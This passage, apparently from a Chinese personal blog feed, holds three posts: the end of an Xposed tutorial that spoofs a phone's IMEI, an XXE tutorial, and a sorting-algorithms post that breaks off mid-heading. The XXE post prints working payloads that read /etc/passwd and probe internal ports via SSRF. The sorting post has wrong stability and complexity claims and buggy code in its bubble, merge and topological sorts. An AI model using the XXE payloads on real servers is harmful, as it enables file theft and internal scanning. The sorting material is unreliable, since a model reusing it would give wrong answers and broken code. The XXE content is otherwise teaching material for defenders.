android:name=&quot;xposedmodule&quot;</span><br><span class="line">        android:value=&quot;true&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposeddescription&quot;</span><br><span class="line">        android:value=&quot;Easy example&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">        android:name=&quot;xposedminversion&quot;</span><br><span class="line">        android:value=&quot;89&quot; /&gt;</span><br></pre></td></tr></table></figure><p>3、打开app目录下的 build.gradle ，将</p><p>compile files(‘libs/XposedBridgeApi-89.jar’)</p><p>更改为</p><p>provided files(‘libs/XposedBridgeApi-89.jar’)</p><p>4、新建Hook入口类 HookMain 实现 xposed 的接口 IXposedHookLoadPackage 并重写方法 handleLoadPackage 如图所示 这个写法格式是固定的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HookMain</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、在 src/main/assets 下新建文件 xposed_init 并将 HookMain 类作为hook的主入口类以<strong>包名+类名</strong>的格式写进去。</p><p>6、检测hook环境是否配置成功，打开项目的MainActivity类并写一个getIMEI方法获取当前系统的imei并在程序运行的时候打印出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.layout);</span><br><span class="line">        Log.i(<span class="string">&quot;手机的imei是&quot;</span>,getIMEI(<span class="keyword">this</span>));</span><br><span class="line">        Toast.makeText(getApplicationContext(),<span class="string">&quot;手机的imei是&quot;</span>+getIMEI(<span class="keyword">this</span>),Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title">getIMEI</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//实例化TelephonyManager对象</span></span><br><span class="line">            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line">            <span class="comment">//获取IMEI号</span></span><br><span class="line">            String imei = telephonyManager.getDeviceId();</span><br><span class="line">            <span class="keyword">if</span> (imei == <span class="keyword">null</span>) &#123;</span><br><span class="line">                imei = <span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> imei + <span class="string">&quot;yeyeye&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/xposed-4.png"></p><p><em>我这边用真机一直没有hook成功，在模拟器上却成功了，不知道是什么原因。</em></p><p>7、环境没问题后，我们就可以使用xposed修改部分修改手机的IMEI号，Hook一个函数需要满足三个条件:</p><ul><li>方法的包名+类名</li><li>方法名</li><li>方法的参数类型</li></ul><p>所以我这边hook的代码是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HookMain</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">         <span class="comment">//固定格式</span></span><br><span class="line">        findAndHookMethod(</span><br><span class="line">                <span class="string">&quot;android.telephony.TelephonyManager&quot;</span>,  <span class="comment">//要hook的包名+类名</span></span><br><span class="line">                lpparam.classLoader,                   <span class="comment">//classLoader固定</span></span><br><span class="line">                <span class="string">&quot;getDeviceId&quot;</span>,                         <span class="comment">//要hook的方法名</span></span><br><span class="line">                                                       <span class="comment">//方法参数 没有就不填</span></span><br><span class="line">                <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="comment">//方法执行前执行</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//方法执行后执行,改方法的返回值一定要在方法执行完毕后更改</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span></span></span><br><span class="line"><span class="function">                            <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                        param.setResult(<span class="string">&quot;355888888888888&quot;</span>);</span><br><span class="line"> </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=850885&amp;highlight=xposed">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=850885&amp;highlight=xposed</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;xposed-原理&quot;&gt;&lt;a href=&quot;#xposed-原理&quot; class=&quot;headerlink&quot; title=&quot;xposed 原理&quot;&gt;&lt;/a&gt;xposed 原理&lt;/h2&gt;&lt;p&gt;Xposed 是一个 Android 平台上的动态劫持框架，它的原理是替换安卓系统 </summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Web安全之XXE</title>
    <link href="http://yejuns.github.io/2021/03/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%94%BB%E5%87%BB/"/>
    <id>http://yejuns.github.io/2021/03/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%94%BB%E5%87%BB/</id>
    <published>2021-03-31T08:01:51.000Z</published>
    <updated>2021-08-09T09:21:10.625Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>XXE漏洞全称XML External Entity Injection，即XML外部实体注入漏洞，是在对不安全的外部实体数据进行处理时引发的安全问题。（我们提交的post数据中，body可以是<code>application/xml</code>的形式）</p><h2 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h2><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，攻击者通过向服务器注入指定的xml实体内容, 从而让服务器加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。也就是说服务端接收和解析了来自客户端的xml数据,而又没有做严格的安全过滤校验, 从而导致xml外部实体注入漏洞的产生。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p><p>以下是一个正常的XML代码POST请求示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”}</p><p>我们尝试编辑恶意的payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码被解释并返回：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;error&quot;</span>: <span class="string">&quot;no results for description root:x:0:0:root:/root:/bin/bash</span></span><br><span class="line"><span class="string">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span></span><br><span class="line"><span class="string">bin:x:2:2:bin:/bin:/bin/sh</span></span><br><span class="line"><span class="string">sys:x:3:3:sys:/dev:/bin/sh</span></span><br><span class="line"><span class="string">sync:x:4:65534:sync:/bin:/bin/sync...</span></span><br></pre></td></tr></table></figure><p>这样，我们就变相的读取了/etc/passwd文件</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>我们也可以使用http URI并强制服务器向我们指定的端点和端口发送GET请求，将XXE转换为SSRF。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:8080&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>尝试与端口8080通信，根据响应时间/长度，攻击者将可以判断该端口是否已被开启。</p><p>xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务 探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;XXE漏洞&quot;&gt;&lt;a href=&quot;#XXE漏洞&quot; class=&quot;headerlink&quot; title=&quot;XXE漏洞&quot;&gt;&lt;/a&gt;XXE漏洞&lt;/h2&gt;&lt;p&gt;XXE漏洞全称XML External Entity Injection，即XML外部实体注入漏洞，是在对不安全的外</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>常用算法-排序</title>
    <link href="http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F/"/>
    <id>http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F/</id>
    <published>2021-03-31T08:01:51.000Z</published>
    <updated>2021-08-05T07:15:57.946Z</updated>
    
    <content type="html"><![CDATA[<h2 id="排序算法比较"><a href="#排序算法比较" class="headerlink" title="排序算法比较"></a>排序算法比较</h2><table><thead><tr><th align="center">排序方法</th><th align="left">时间复杂度</th><th align="center">空间复杂度</th><th align="left">稳定性</th></tr></thead><tbody><tr><td align="center">插入排序</td><td align="left">O(n^2)</td><td align="center">O(1)</td><td align="left">稳定</td></tr><tr><td align="center">冒泡排序</td><td align="left">O(n^2)</td><td align="center">O(1)</td><td align="left">稳定</td></tr><tr><td align="center">选择排序</td><td align="left">O(n^2)</td><td align="center">O(1)</td><td align="left">不稳定</td></tr><tr><td align="center">归并排序</td><td align="left">O(nlog2n)</td><td align="center">O(nlog2n)</td><td align="left">不稳定</td></tr><tr><td align="center">快速排序</td><td align="left">O(nlog2n)</td><td align="center">O(n)</td><td align="left">稳定</td></tr><tr><td align="center">堆排序</td><td align="left">O(nlog2n)</td><td align="center">O(1)</td><td align="left">不稳定</td></tr></tbody></table><ul><li>稳定：如果 a 原本在 b 前面，而a=b，排序之后 a 仍然在 b 的前面。</li></ul><h3 id="插入排序（Insertion-Sort）"><a href="#插入排序（Insertion-Sort）" class="headerlink" title="插入排序（Insertion Sort）"></a>插入排序（Insertion Sort）</h3><p>从前到后构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到位置并插入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>, j, current; i &lt; nums.length; i++) &#123;</span><br><span class="line">        current = nums[i];  <span class="comment">//监视哨的作用</span></span><br><span class="line">        <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span> &amp;&amp; nums[j] &gt; current; j--) &#123;</span><br><span class="line">            nums[j + <span class="number">1</span>] = nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        nums[j + <span class="number">1</span>] = current;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="选择排序（Selection-sort）"><a href="#选择排序（Selection-sort）" class="headerlink" title="选择排序（Selection sort）"></a>选择排序（Selection sort）</h3><p>每次选择最小值，然后放到待排序数组的开始位置。</p><p>选择排序是给每个位置选择当前元素最小的，比如给第一个位置选择最小的，在剩余元素里面给第二个元素选择第二小的，依次类推，直到第n-1个元素，第n个元素不用选择了，因为只剩下它一个最大的元素了。那么，在一趟选择中，如果当前元素比一个元素大，而该小的元素又出现在一个和当前元素相等的元素后面，那么交换后稳定性就被破坏了。举个例子，序列5 8 5 2 9，我们知道第一遍选择第1个元素5会和2交换，那么原序列中2个5的相对前后顺序就被破坏了，所以选择排序不是一个稳定的排序算法。</p><h3 id="冒泡排序-（Bubble-Sort）"><a href="#冒泡排序-（Bubble-Sort）" class="headerlink" title="冒泡排序 （Bubble Sort）"></a>冒泡排序 （Bubble Sort）</h3><p>嵌套循环，每次查看相邻的元素，如果逆序，则交换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> hasChange = <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// hasChange的作用是判断某次循环是否开始，方便提前结束循环</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">        hasChange = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;num.length-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num[j]&gt;num[j+<span class="number">1</span>])&#123;</span><br><span class="line">                swap(num[j],num[j+<span class="number">1</span>]); </span><br><span class="line">            &#125;</span><br><span class="line">            hasChange = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="归并排序（Merge-Sort）"><a href="#归并排序（Merge-Sort）" class="headerlink" title="归并排序（Merge Sort）"></a>归并排序（Merge Sort）</h3><p>使用的分治的思想。把序列递归地分成短序列，然后把各个有序的段序列合并成一个有序的长序列，不断合并直到原序列全部排好序</p><ol><li>把长度为n的输入序列分成长度为n/2的子序列</li><li>对这两个子序列分别进行归并排序</li><li>将两个排序好的子序列合并成一个最终的排序序列<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(hi &lt;= lo) <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">int</span> mid = (lo + hi) &gt;&gt; <span class="number">1</span>; <span class="comment">// (lo + hi) / 2  位运算速度会更快</span></span><br><span class="line">        sort(A, lo, mid);</span><br><span class="line">        sort(A, mid + <span class="number">1</span>, hi);</span><br><span class="line">        merge(A, lo, mid, hi);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里 merge 的操作就是把两个有序的数组合并成一个有序的数组</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> lo,<span class="keyword">int</span> mid,<span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] temp = Arrays.copyOf(arr,arr.length);</span><br><span class="line">        <span class="keyword">int</span> i = lo, j = mid + <span class="number">1</span>, k = lo;</span><br><span class="line">        <span class="keyword">while</span> (i&lt;mid &amp;&amp; j&lt;hi)&#123;</span><br><span class="line">            arr[k++] = temp[i]&gt;temp[j]?temp[i++]:temp[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid) arr[k++] = temp[i++];</span><br><span class="line">        <span class="keyword">while</span> (j &lt;= hi)  arr[k++] = temp[j++];</span><br><span class="line"></span><br><span class="line"><span class="comment">//        for(int p = 0;p&lt;temp.length;p++)&#123;</span></span><br><span class="line"><span class="comment">//            arr[p] = temp[p];</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="快速排序（Quick-sort）"><a href="#快速排序（Quick-sort）" class="headerlink" title="快速排序（Quick sort）"></a>快速排序（Quick sort）</h3>数组随机取一个标杆pivot，将小于pivot的元素放在pivot左边，大于pivot的元素放在pivot右边，然后依次对左边和右边的子数组继续快排。以达到整个序列有序<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lo &gt;= hi) <span class="keyword">return</span>; <span class="comment">//如果只剩下最后一个元素，就直接返回</span></span><br><span class="line">    <span class="keyword">int</span> p = partition(nums, lo, hi);  <span class="comment">//通过partition函数，使得p左边的值都比p要小，右边的都比p大</span></span><br><span class="line">    sort(nums, lo, p - <span class="number">1</span>);</span><br><span class="line">    sort(nums, p + <span class="number">1</span>, hi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//随机选出一个数字，并和 hi 互换 --&gt; 此时选出进行比较的值就在 hi 处</span></span><br><span class="line">    swap(nums, randRange(lo, hi), hi);</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = lo, j = lo; j &lt; hi; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[j] &lt;= nums[hi]) &#123;</span><br><span class="line">            swap(nums, i++, j); <span class="comment">//注意这里是先交换，然后 ++ </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(nums, i, j); <span class="comment">//把基准值放在i的位置，这样 i 后面的值都比i要大</span></span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="拓扑排序-（Topological-sort）"><a href="#拓扑排序-（Topological-sort）" class="headerlink" title="拓扑排序 （Topological sort）"></a>拓扑排序 （Topological sort）</h3><p>前提：1、必须是有向图；2、图里面没有环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Queue&lt;Integer&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">0</span>; v &lt; V; v++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (indegree[v] == <span class="number">0</span>) q.add(v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!q.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">int</span> v = q.poll();</span><br><span class="line">            print(v);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> u = <span class="number">0</span>; u &lt; adj[v].length; u++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (--indegree[u] == <span class="number">0</span>) &#123;</span><br><span class="line">                    q.add(u);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序-（Heap-sort）"><a href="#堆排序-（Heap-sort）" class="headerlink" title="堆排序 （Heap sort）"></a>堆排序 （Heap 